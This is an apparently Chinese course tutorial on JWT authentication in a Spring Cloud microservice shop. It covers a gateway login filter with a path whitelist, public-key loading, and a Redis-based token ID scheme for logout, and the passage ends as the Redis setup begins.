<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">verify</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.服务端获取cookie中的token</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isBlank(token)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;未登录或者登录超时!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.通过公钥验证token是否有效</span></span><br><span class="line">    Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        payload = JwtUtils.getInfoFromToken(token, prop.getPublicKey(), UserInfo.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>,<span class="string">&quot;用户未登录或登录超时！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.如果有效，返回用户信息</span></span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">    <span class="keyword">if</span>(userInfo == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户未登录或登录超时！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> userInfo.getUsername();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="JWT登录02"><a href="#JWT登录02" class="headerlink" title="JWT登录02"></a>JWT登录02</h1><h2 id="网关的用户鉴权"><a href="#网关的用户鉴权" class="headerlink" title="网关的用户鉴权"></a>网关的用户鉴权</h2><p>昨天的课程中，我们实现了登录相关的几个功能，也就是给用户授权。接下来，用户访问我们的系统，我们还需要根据用户的身份，判断是否有权限访问微服务资源，就是鉴权。</p>
<p>大部分的微服务都必须做这样的权限判断，但是如果在每个微服务单独做权限控制，每个微服务上的权限代码就会有重复，如何更优雅的完成权限控制呢？</p>
<p>我们可以在整个服务的入口完成服务的权限控制，这样微服务中就无需再做了，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022683.png" alt="image-20200330093245307"></p>
<p>接下来，我们在网关编写过滤器，对用户的token进行校验，完成初步的权限判断。</p>
<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>权限控制，一般有粗粒度、细粒度控制之分，但不管哪种，前提是用户必须先登录。知道访问者是谁，才能知道这个人具备怎样的权限，可以访问那些服务资源（也就是微服务接口）。</p>
<p>因此，权限控制的基本流程是这样：</p>
<ul>
<li>1）获取用户的登录凭证jwt</li>
<li>2）解析jwt，获取用户身份<ul>
<li>如果解析失败，证明没有登录，返回401</li>
</ul>
</li>
</ul>
<p>&#x2F;&#x2F; TODO</p>
<ul>
<li><em>3）根据身份，查询用户权限信息</em></li>
<li><em>4）获取当前请求资源（微服务接口路径）</em></li>
<li><em>5）判断是否有访问资源的权限</em></li>
</ul>
<p>一般权限信息会存储到数据库，会对应角色表和权限表：</p>
<ul>
<li>角色：就是身份，例如普通用户，金钻用户，黑钻用户，商品管理员</li>
<li>权限：就是可访问的访问资源，如果是URL级别的权限控制，包含请求方式、请求路径、等信息</li>
</ul>
<p>一个角色一般会有多个权限，一个权限也可以属于多个用户，属于多对多关系。根据角色可以查询到对应的所有权限，再根据权限判断是否可以访问当前资源即可。</p>
<p>在我们的功能中，因为还没有写权限功能，所以暂时只有一个角色，就是普通用户，可以访问的是商品及分类品牌等的查询功能，以及自己的信息。以后编写权限服务时，再补充相关业务。</p>
<h3 id="加载公钥"><a href="#加载公钥" class="headerlink" title="加载公钥"></a>加载公钥</h3><p>权限控制的第一部分，就是获取cookie，并解析jwt，那么肯定需要公钥。我们在<code>ly-gateway</code>中配置公钥信息，并在服务启动时加载。</p>
<p>另外，校验用户登录还需要去token的黑名单检查，需要引入redis</p>
<p>首先引入所需要的依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后编写属性文件：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">jwt:</span></span><br><span class="line">    <span class="attr">pubKeyPath:</span> <span class="string">C:/develop/ssh/id_rsa.pub</span> <span class="comment"># 公钥地址</span></span><br></pre></td></tr></table></figure>

<p>编写属性类，读取公钥：</p>
<p>得在属性注入之后加载公钥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.RsaUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ly.jwt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtProperties</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 公钥文件地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String pubKeyPath;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 公钥对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> PublicKey publicKey;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.publicKey = RsaUtils.getPublicKey(pubKeyPath);</span><br><span class="line">            log.info(<span class="string">&quot;【网关】加载公钥成功！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;【网关】初始化公钥失败！&quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="编写过滤器逻辑"><a href="#编写过滤器逻辑" class="headerlink" title="编写过滤器逻辑"></a>编写过滤器逻辑</h3><p>有了公钥，就可以编写权限控制逻辑了，权限验证通过，放行到微服务；不通过，则拦截并返回401给用户。因此拦截的逻辑需要在请求被路由之前执行，你能想到用什么实现吗？</p>
<p>没错，就是Gateway中的GlobalFilter。</p>
<p>基本逻辑：</p>
<ul>
<li>获取cookie中的token</li>
<li>通过JWT对token进行解析<ul>
<li>解析通过，继续权限校验</li>
<li>解析不通过，返回401</li>
</ul>
</li>
<li>TODO 根据用户身份获取权限信息</li>
<li>TODO 获取当前请求路径，判断权限</li>
<li>TODO 通过：则放行；不通过：则返回401</li>
</ul>
<p>我们在<code>ly-gateway</code>的<code>com.leyou.gateway.filters</code>包下添加一个过滤器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exceptions.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1.获取Request对象</span></span><br><span class="line">            <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">            <span class="comment">// 2.获取cookie</span></span><br><span class="line">            <span class="type">HttpCookie</span> <span class="variable">cookie</span> <span class="operator">=</span> request.getCookies().getFirst(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">            <span class="keyword">if</span>(cookie == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;未登录或状态无效！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3.校验token是否有效</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// TODO 权限判断</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">                <span class="comment">// 解析失败，token有误</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;未登录或状态无效！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 4.有效，放行</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LyException e) &#123;</span><br><span class="line">            <span class="comment">// 5.无效，状态码为401，未授权</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="comment">// 拦截请求</span></span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 登录拦截，可以采用最高优先级！</span></span><br><span class="line">        <span class="keyword">return</span> HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>此时我们尝试再次登录：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022684.png" alt="image-20200322233028428"> </p>
<p>登录接口也被拦截器拦截了！！！</p>
<p>要注意，并不是所有的路径我们都需要拦截，例如：</p>
<ul>
<li><p>登录校验接口：<code>/auth/user/login</code></p>
</li>
<li><p>注册接口：<code>/user/info/register</code></p>
<p>数据校验接口：<code>/user/info/exists/</code></p>
</li>
<li><p>发送验证码接口：<code>/user/info/code</code></p>
</li>
<li><p>搜索接口：<code>/search/**</code></p>
</li>
</ul>
<p>所以，我们需要在拦截时，配置一个白名单，如果在名单内，则不进行拦截。</p>
<p>在<code>ly-gateway</code>的<code>application.yaml</code>中添加规则：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">filter:</span></span><br><span class="line">    <span class="attr">allowRequests:</span></span><br><span class="line">      <span class="string">&quot;[/auth/user/login]&quot;</span><span class="string">:</span> </span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;POST&quot;</span> <span class="comment"># 登录</span></span><br><span class="line">      <span class="string">&quot;[/auth/user/verify]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;GET&quot;</span> <span class="comment"># 首页登录校验</span></span><br><span class="line">      <span class="string">&quot;[/search/goods]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;POST&quot;</span> <span class="comment"># 搜索</span></span><br><span class="line">      <span class="string">&quot;[/user/info/exists]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;GET&quot;</span> <span class="comment"># 校验用户数据是否存在</span></span><br><span class="line">      <span class="string">&quot;[/user/info]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;POST&quot;</span> <span class="comment">#  </span></span><br><span class="line">      <span class="string">&quot;[/item]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;GET&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后在<code>ly-gateway</code>的<code>com.leyou.gateway.config</code>包中定义类<code>FilterProperties</code>，读取这些属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(&quot;ly.filter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterProperties</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Set&lt;String&gt;&gt; allowRequests;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后修改过滤器<code>LoginUserFilter</code>的代码，用户登录信息<strong>校验失败以后</strong>，判断用户路径是否是白名单中的路径，如果是则放行，如果不是则拦截。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exceptions.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.FilterProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FilterProperties filterProp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp, FilterProperties filterProp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">        <span class="built_in">this</span>.filterProp = filterProp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1.获取Request对象</span></span><br><span class="line">            <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">            <span class="comment">// 2.获取cookie</span></span><br><span class="line">            <span class="type">HttpCookie</span> <span class="variable">cookie</span> <span class="operator">=</span> request.getCookies().getFirst(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">            <span class="keyword">if</span>(cookie == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;未登录或状态无效！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3.校验token是否有效</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// TODO 权限判断</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">                <span class="comment">// 解析失败，token有误</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;未登录或状态无效！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 4.有效，放行</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LyException e) &#123;</span><br><span class="line">            <span class="comment">// 5.登录无效，判断是否在白名单中，如果在也要放行</span></span><br><span class="line">            <span class="keyword">if</span>(isAllowRequest(exchange))&#123;</span><br><span class="line">                <span class="comment">// 在白名单许可中，放行</span></span><br><span class="line">                <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 状态码为401，未授权</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="comment">// 拦截请求</span></span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAllowRequest</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取当前请求Request</span></span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="comment">// 2.获取请求方式和请求路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethodValue();<span class="comment">// 方式：GET</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPath().toString(); <span class="comment">// 路径： /item/brand/2032</span></span><br><span class="line">        <span class="comment">// 3.遍历白名单</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Set&lt;String&gt;&gt; entry : filterProp.getAllowRequests().entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 白名单路径前缀</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">allowPathPrefix</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="comment">// 白名单methods集合</span></span><br><span class="line">            Set&lt;String&gt; allowMethods = entry.getValue();</span><br><span class="line">            <span class="comment">// 判断是否符合</span></span><br><span class="line">            <span class="keyword">if</span>(StringUtils.startsWith(path, allowPathPrefix) &amp;&amp; allowMethods.contains(method))&#123;</span><br><span class="line">                <span class="comment">// 符合白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不符合白名单</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 登录拦截，可以采用最高优先级！</span></span><br><span class="line">        <span class="keyword">return</span> HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="登录控制"><a href="#登录控制" class="headerlink" title="登录控制"></a>登录控制</h2><h3 id="退出登录"><a href="#退出登录" class="headerlink" title="退出登录"></a>退出登录</h3><p>首页左上角，登录后除了显示用户名，还有一个注销登录按钮：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022685.png" alt="1554627778912"></p>
<p>点击这个按钮，该如何实现退出登录呢？</p>
<h4 id="JWT登录的问题"><a href="#JWT登录的问题" class="headerlink" title="JWT登录的问题"></a>JWT登录的问题</h4><p>回想下以前怎么实现的：</p>
<ul>
<li>用户点击退出，发起请求到服务端</li>
<li>服务端删除用户session即可</li>
</ul>
<p>我们现在登录是无状态的，也就没有session，那该怎么办呢？</p>
<p>有同学会想，太简单了，直接删除cookie就可以了。</p>
<p>别忘了，我们设置了httponly，JS无法操作cookie。因此，删除cookie也必须发起请求到服务端，由服务端来删除cookie。</p>
<p>那么，是不是删除了cookie，用户就完成了退出登录呢？</p>
<p>设想一下，删除了cookie，只是让用户在当前浏览器上的token删除了，但是这个<strong>token依然是有效的</strong>！这就是JWT的另外一个缺点了，无法控制TOKEN让其失效。如果用户提前备份了token，那么重新填写到cookie后，登录状态依然有效。</p>
<p>所以，我们<strong>不仅仅要让浏览器端清除cookie，而且要让这个cookie中的token失效</strong>！</p>
<h4 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h4><p>怎样才能实现这样的效果呢？</p>
<p>大家肯定能想到很多办法，但是无论哪种思路，都绕不可一点：JWT的无法修改特性。因此<strong>我们不能修改token来标记token无效，而是在服务端记录token状态</strong>，于是就违背了无状态性的特性。</p>
<p>因此，要实现服务端对用户登录控制，就不得不违背无状态的特性。但是，只要尽可能减少在服务端存储的数据量，即便是有状态也不是不可以。<strong>规定是死的，人是活的</strong>！</p>
<p>我们的解决思路是这样的：</p>
<ul>
<li>用户登录后，生成JWT，其中包含用户身份、JWT的ID（JTI）</li>
<li>以用户id为key，把JWT的id存入redis，只有redis中有id的JWT，才是有效的JWT</li>
<li>并且给Redis中的用户id设置有效期，比如30分钟，有效期到自动删除，登录失效</li>
<li>退出登录时，把JTI从Redis删除，把JWT从cookie删除，即可</li>
</ul>
<p>如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022686.png" alt="image-20200325115057407"></p>
<p>因此，我们要做的事情包括这些：</p>
<ul>
<li>修改ly-auth中的登录逻辑，在其中加上存入JTI到Redis的部分</li>
<li>修改ly-auth中的判断是否登录的逻辑，加上对Redis中的JTI的校验</li>
<li>修改ly-gateway中的登录校验拦截器，加上对Redis中的JTI的校验</li>
<li>退出登录，除了删除cookie，还要删除redis中的JTI</li>
</ul>
<h4 id="修改登录逻辑"><a href="#修改登录逻辑" class="headerlink" title="修改登录逻辑"></a>修改登录逻辑</h4><p>在登录逻辑中，需要生成token以后，把token的ID存入redis中，并设置有效期。流程图如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022687.png" alt="image-20200224160518176"></p>
<h5 id="定义Redis常量类"><a href="#定义Redis常量类" class="headerlink" title="定义Redis常量类"></a>定义Redis常量类</h5><p>存入Redis时，需要使用到如：key的前缀、过期时间、等数据。我们在<code>ly-common</code>的<code>com.leyou.common.constants</code>包中定义一个常量类，记录这些值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.constants;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConstants</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户登录时记录TokenID的key前缀</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JTI_KEY_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;auth:login:uid:&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户登录时记录TokenID的超时时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Long</span> <span class="variable">TOKEN_EXPIRE_MINUTES</span> <span class="operator">=</span> <span class="number">30L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="修改登录业务"><a href="#修改登录业务" class="headerlink" title="修改登录业务"></a>修改登录业务</h5><p>首先在修改<code>ly-auth-service</code>的pom文件中引入redis的依赖：</p>
